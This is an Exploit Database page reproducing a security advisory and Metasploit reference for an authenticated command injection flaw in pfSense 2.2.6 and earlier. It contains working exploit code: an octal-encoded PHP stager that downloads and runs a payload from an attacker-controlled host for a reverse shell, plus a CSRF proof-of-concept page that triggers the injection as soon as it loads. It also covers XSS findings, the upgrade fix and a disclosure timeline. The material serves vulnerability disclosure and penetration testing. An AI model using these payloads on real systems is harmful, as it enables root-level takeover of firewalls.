### pfSense authenticated graph status RCE

Disclosed
04/18/2016

Created
06/14/2018

#### Description

pfSense, a free BSD based open source firewall distribution,
version <= 2.2.6 contains a remote command execution
vulnerability post authentication in the \_rrd\_graph\_img.php page.
The vulnerability occurs via the graph GET parameter. A non-administrative
authenticated attacker can inject arbitrary operating system commands
and execute them as the root user. Verified against 2.2.6, 2.2.5, and 2.1.3.

```
msf > use exploit/unix/http/pfsense_graph_injection_exec
msf exploit(pfsense_graph_injection_exec) > show targets
    ...targets...

PfSense Community Edition Multiple Vulnerabilities
Affected versions: PfSense Community Edition <= 2.2.6

PDF:
http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf

+-----------+
|Description|
+-----------+
The pfSense community edition firewall is vulnerable to multiple
vulnerabilities, including remote code execution via command injection
as an authenticated non-administrative user, stored and reflected
cross-site scripting.

+------------+
|Exploitation|
+------------+
==Command Injection==
The status_rrd_graph_img.php page is vulnerable to command injection via
the graph GET parameter. A non-administrative authenticated attacker
having access privileges to the graph status functionality can inject
arbitrary operating system commands and execute them in the context of
the root user. Although input validation is performed on the graph
parameter through a regular expression filter, the pipe character is not
removed. Octal characters sequences can be used to encode a payload,
bypass the filter for illegal characters, and create a PHP file to
download and execute a malicious file (i.e. reverse shell) from a remote
attacker controlled host.

[Octal-encoded PHP Stager]
stager = (
'echo \'<?php $shell =
file_get_contents("http://[ATTACKER_IP]/shell.elf");' +
'file_put_contents("myshell.elf", $shell);' +
'system("chmod 755 myshell.elf && ./myshell.elf"); ?> \' > shellexec'
)
encoded_stager = ''
for c in stager:
 encoded_stager += "\\\\%03d" %(int(oct(ord(c))))
print encoded_stager

[CSRF POC]
<html>
<head>
  <script>
    function sploit() {
    var query = "database=-throughput.rrd&graph=file|printf
[ENCODED_STAGER]|sh|echo ";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://<target>/status_rrd_graph_img.php?" +
query, true);
    xhr.withCredentials = true;
    xhr.send();

    setTimeout(shellexec, 2000);
    }

    function shellexec() {
        document.csrf_exploit_exec.submit();
    }
  </script>
</head>
<body onload="sploit();">
  <form name="csrf_exploit_exec"
action="https://<target>/status_rrd_graph_img.php">
      <input type="hidden" name="database" value="-throughput.rrd" />
      <input type="hidden" name="graph" value="file|php shellexec|echo " />
  </form>
</body>
</html>

==Cross-site Scripting==
Multiple instances of stored and reflected cross-scripting
vulnerabilities exist in the web interface of the application. An
authenticated attacker with limited privileges can run arbitrary
JavaScript code in the context of admin users’ session and extend their
access to administrative areas of the application (i.e. command prompt
functionality).

+----------+
| Solution |
+----------+
Upgrade to pfSense 2.3. This may be performed in the web interface or
from the console.

+------------+
|  Timeline  |
+------------+
10/02/2016 – Initial disclosure to pfSense.
11/02/2016 – Vendor confirms receipt of advisory and provides fixes.
16/02/1016 – Sent follow up email about public release.
16/02/2016 – Vendor requests advisory disclosure after release of new
software build.
12/04/2016 – Release of patched software build and vendor disclosure of
security advisories.
15/04/2016 – Public disclosure of security advisory.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
